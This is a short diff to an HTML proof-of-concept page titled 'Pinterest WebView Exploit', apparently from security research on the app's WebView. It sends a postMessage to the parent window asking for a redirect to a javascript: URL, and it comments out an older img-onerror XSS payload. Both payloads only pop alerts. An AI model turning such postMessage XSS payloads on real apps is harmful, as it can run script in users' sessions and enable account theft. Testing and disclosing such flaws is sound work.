@@ -10,11 +10,16 @@
   <body>
     <h1>Pinterest WebView Exploit</h1>
     <script>
-  window.addEventListener("message", (e) => {
-    alert("Received message: " + JSON.stringify(e.data));
-  });
+      window.parent.postMessage({
+  action: "redirect",
+  url: "javascript:alert('XSS from redirect')"
+}, "*")
 
-  window.parent.postMessage("<img src=x onerror=alert('From postMessage')>", "*");
+  // window.addEventListener("message", (e) => {
+  //   alert("Received message: " + JSON.stringify(e.data));
+  // });
+
+  // window.parent.postMessage("<img src=x onerror=alert('From postMessage')>", "*");
 </script>
 
   </body>
